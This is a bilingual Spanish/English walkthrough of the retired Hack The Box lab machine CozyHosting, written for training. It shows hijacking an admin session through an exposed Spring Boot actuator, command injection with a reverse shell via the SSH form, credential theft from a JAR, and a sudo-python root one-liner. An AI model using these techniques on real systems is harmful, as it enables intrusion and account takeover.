# CozyHosting [Easy]

> **ES:** Hosting con Spring Boot donde un actuator expuesto filtra la sesión de admin; de ahí a RCE por inyección de comandos y root por sudo de Python.
> **EN:** Hosting box running Spring Boot where an exposed actuator leaks the admin session; then RCE via command injection and root via sudo python.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/CozyHosting] |
| **URL** | https://app.hackthebox.com/machines/CozyHosting |
| **IP lab** | 10.10.11.230 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía `/actuator/sessions` → secuestro de `JSESSIONID` admin → inyección en `host`/`username` (Función de SSH) → reverse shell → `sudo python`.
> **EN:** Get `user.txt` and `root.txt` via `/actuator/sessions` → admin `JSESSIONID` hijack → injection in `host`/`username` (SSH feature) → reverse shell → `sudo python`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] ffuf / dirsearch
- [ ] curl + burp
- [ ] ssh
- [ ] python (privesc)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** 22/SSH y 80/nginx → Spring Boot (`cozyhosting.htb`). Se mapea el vhost y se buscan endpoints.
> **EN:** 22/SSH and 80/nginx → Spring Boot (`cozyhosting.htb`). Map the vhost and look for endpoints.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.230
echo '10.10.11.230 cozyhosting.htb' | sudo tee -a /etc/hosts
ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado / Result:** App Cozy Hosting (Spring Boot). Endpoint interesante: `/actuator`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** `/actuator/mappings` y `/actuator/sessions` exponen sesiones activas; se extrae el `JSESSIONID` del admin (`kanderson`) sin conocer su password.
> **EN:** `/actuator/mappings` and `/actuator/sessions` expose active sessions; extract the admin (`kanderson`) `JSESSIONID` without knowing the password.

```bash
curl -s http://cozyhosting.htb/actuator/mappings | head -60
curl -s http://cozyhosting.htb/actuator/sessions | python3 -m json.tool
# copiar JSESSIONID de kanderson y reutilizar cookie en el navegador/curl
```

**Resultado / Result:** Sesión admin secuestrada vía actuator (mala exposición de endpoints).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Como admin, la función "SSH to host" concatena `host`/`username` sin sanear; se inyecta `$(...)`/backticks o `;` para RCE como usuario `app`.
> **EN:** As admin, the "SSH to host" feature concatenates `host`/`username` unsanitized; inject `$(...)`/backticks or `;` for RCE as `app`.

```bash
nc -lvnp 9001
# en el formulario admin (con cookie JSESSIONID robada):
# host = <atacante>; comando con reverse shell python3/bash
curl -s -b 'JSESSIONID=<robada>' --data 'host=<payload>&username=<payload>' http://cozyhosting.htb/executessh
whoami  # app
```

**Resultado / Result:** Reverse shell como `app`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** En el host se lee `/app/cloudhosting-*.jar` / `application.properties` con credencial Postgres; reutilizada en SSH como `josh` se lee `user.txt` (flag omitida).
> **EN:** On the host read `/app/cloudhosting-*.jar` / `application.properties` with the Postgres credential; reused over SSH as `josh` to read `user.txt` (flag redacted).

```bash
ls -l /app/; strings /app/cloudhosting-*.jar | grep -i 'postgres\|password' | head
ssh josh@cozyhosting.htb
id; cat ~/user.txt
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite ejecutar python sin password; una línea `os.setuid(0); os.system("/bin/bash")` da shell root.
> **EN:** `sudo -l` allows passwordless python; one-liner `os.setuid(0); os.system("/bin/bash")` gives a root shell.

```bash
sudo -l
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami  # root
cat /root/root.txt
```

**Resultado / Result:** Root vía sudo python (GTFOBins).

---

## 🧠 Lo aprendido / Learned

> **ES:** Endurecer Spring Boot Actuator; riesgo de concatenar input en comandos SSH; reutilización de secretos del JAR; sudo python = root.
> **EN:** Harden Spring Boot Actuator; risk of concatenating input into SSH commands; secret reuse from the JAR; sudo python = root.

- [ ] Deshabilitar `/actuator/sessions` en producción
- [ ] Evitar `os.system`/concatenación con input de usuario
- [ ] Revisar `sudo -l` y GTFOBins

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** HTB CozyHosting — 0xdf (https://0xdf.gitlab.io/2024/03/02/htb-cozyhosting.html) — 0xdf
- **Walkthrough de referencia:** HackTheBox CozyHosting Write-Up (https://cloverophile.medium.com/hackthebox-cozyhosting-write-up-5ced9655303d)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido normalizado desde el suelto `Soluciones/Machines/unclasified/cozyhosting.md` (solo cabecera `Machine: CozyHosting / Pwned`); procedimiento reconstruido por técnica conocida (Spring Boot actuator/session) y fuentes citadas; el archivo suelto se deja intacto.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
